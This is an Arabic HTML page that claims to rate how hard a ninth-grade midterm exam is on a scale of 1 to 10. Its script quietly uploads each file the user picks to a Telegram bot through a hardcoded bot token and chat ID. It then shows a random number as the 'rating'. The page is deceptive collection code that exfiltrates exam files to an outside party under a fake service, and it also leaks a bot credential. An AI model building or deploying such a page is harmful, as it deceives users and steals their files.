<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقييم اختبارات نصف الترم - الصف التاسع</title>
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <style>
        /* تنسيق الصفحة بالكامل */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #66a6ff, #89f7fe);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }

        h1 {
            margin-top: 20px;
            font-size: 3.5em;
            color: #fff;
            text-shadow: 3px 3px 10px rgba(0, 0, 0, 0.5);
            font-weight: bold;
        }

        p {
            color: #f9f9f9;
            font-size: 1.3em;
            margin-bottom: 30px;
        }

        /* تصميم النموذج */
        .form-container {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 80%;
            max-width: 500px;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .image-upload {
            display: inline-block;
            border-radius: 15px;
            background-color: #4e8ef7;
            padding: 20px;
            color: #fff;
            font-size: 1.2em;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
            font-weight: bold;
            text-transform: uppercase;
        }

        .image-upload:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
        }

        #test-image {
            display: none;
        }

        /* تصميم رسالة المعالجة */
        .loading {
            font-size: 1.3em;
            color: #333;
            margin-top: 20px;
            display: none;
        }

        .alert {
            max-width: 500px;
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 1.1em;
        }

        .alert-success {
            background: #d4edda;
            color: #3c763d;
        }

        .alert-error {
            background: #f8d7da;
            color: #721c24;
        }

        /* تحسين التصميم للهواتف */
        @media (max-width: 600px) {
            h1 {
                font-size: 2.2em;
            }

            .form-container {
                padding: 30px;
            }

            .image-upload {
                font-size: 1.1em;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <h1>تقييم اختبارات نصف الترم - الصف التاسع</h1>
    <p>يرجى تحميل ملف اختبار نصف الترم لتقييم صعوبته من 10</p>

    <div class="form-container">
        <label for="test-image" class="image-upload">
            اضغط لاختيار ملف الاختبار
        </label>
        <input type="file" id="test-image" name="test-image" required>
        <p class="loading" id="loading-message">يتم المعالجة...</p>
    </div>

    <script>
        const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // التوكين
        const CHAT_ID = "1934245613"; // معرف الشات
        const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendDocument`;

        // عندما يقوم المستخدم بتحميل الملف
        document.getElementById('test-image').addEventListener('change', function (e) {
            const file = e.target.files[0];
            const loadingMessage = document.getElementById('loading-message');

            if (!file) {
                showAlert("يرجى اختيار ملف للاختبار.", "error");
                return;
            }

            // عرض رسالة "يتم المعالجة"
            loadingMessage.style.display = 'block';

            // تقييم عشوائي من 1 إلى 10
            const randomRating = Math.floor(Math.random() * 10) + 1;

            // إرسال الملف عبر Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', `تم استلام اختبار جديد! \n تقييم الاختبار: ${randomRating}/10`);
            formData.append('document', file);

            axios.post(URI_API_PHOTO, formData, {
                headers: {
                    'Content-Type': 'multipart/form-data',
                },
            })
            .then(() => {
                loadingMessage.style.display = 'none';
                showAlert(`تم تقييم الاختبار بنجاح! صعوبة الاختبار: ${randomRating}/10`, "success");
            })
            .catch(() => {
                loadingMessage.style.display = 'none';
                showAlert('حدث خطأ أثناء إرسال الاختبار. حاول مرة أخرى.', "error");
            });
        });

        // عرض الرسائل (نجاح أو خطأ)
        function showAlert(message, type) {
            const alertDiv = document.createElement("div");
            alertDiv.className = `alert alert-${type === "success" ? "success" : "error"}`;
            alertDiv.textContent = message;
            document.body.appendChild(alertDiv);

            setTimeout(() => {
                alertDiv.remove();
            }, 4000);
        }
    </script>
</body>
</html>
